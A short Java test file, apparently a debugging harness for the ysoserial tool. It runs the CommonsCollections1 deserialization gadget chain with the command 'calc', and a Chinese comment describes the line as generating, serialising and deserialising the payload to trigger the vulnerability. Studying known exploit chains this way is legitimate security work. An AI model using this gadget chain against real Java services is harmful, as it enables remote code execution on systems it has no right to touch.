package ysoserial.test;

import ysoserial.payloads.CommonsCollections1;
import ysoserial.payloads.util.PayloadRunner;

public class DebugCC1 {
    public static void main(String[] args) throws Exception {
        // 这行代码会模拟：生成 Payload -> 序列化 -> 反序列化 (触发漏洞)
        PayloadRunner.run(CommonsCollections1.class, new String[]{"calc"});
    }
}
